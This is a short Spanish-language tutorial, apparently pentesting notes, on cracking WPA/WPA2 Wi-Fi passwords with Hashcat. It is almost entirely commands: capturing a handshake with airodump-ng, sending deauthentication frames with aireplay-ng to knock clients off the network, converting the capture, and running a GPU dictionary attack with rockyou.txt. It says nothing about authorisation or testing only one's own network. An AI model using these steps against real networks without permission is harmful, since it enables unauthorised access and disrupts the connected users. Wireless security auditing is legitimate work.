# Cracking WPA/WPA2 con Hashcat

Este método utiliza la potencia de una tarjeta gráfica (GPU) para descifrar contraseñas WPA2 de manera más eficiente que los métodos tradicionales basados en CPU. Para ello, se emplea la herramienta **Hashcat**, que permite aprovechar la capacidad de cálculo de la GPU para agilizar el proceso.

***

#### **Pasos del proceso**

**Capturar paquete**&#x20;

```
airodump-ng --channel 6 --bssid -w  <archivo_salida> wlan0 
```

**Enviar paquetes de desautenticacion**&#x20;

```
aireplay-ng --deauth 10 -a -c wlan0mon
```

**Conversión del archivo Handshake**

Convierte el archivo `.cap` al formato `.hccapx` necesario para Hashcat. Usa `hcxpcapngtool` o una herramienta similar.

```bash
hcxpcapngtool -o archivo_convertido.hccapx archivo_original.cap
```

***

**Preparar el ataque**

* **Cargar el archivo handshake:** Añade el archivo `.hccapx` previamente convertido.
* **Seleccionar tipo de cifrado:** WPA2 corresponde al hash tipo `2500`.
* **Añadir wordlist:** Utiliza una lista de posibles contraseñas, como `rockyou.txt`.

**Descifrar la clave**

```bash
hashcat -m 2500 -a 0 archivo_convertido.hccapx rockyou.txt --force
```

***

**Ejecutar Hashcat con GPU**

Para asegurarte de usar la GPU, verifica y selecciona los dispositivos disponibles.

**Comandos para listar dispositivos**

```bash
hashcat -I
```

#### **Descifrar la clave**

```bash
hashcat -m 2500 -a 0 archivo_convertido.hccapx wordlist.txt --opencl-device-types 1
```

* `--opencl-device-types 1`: Utiliza exclusivamente la GPU.
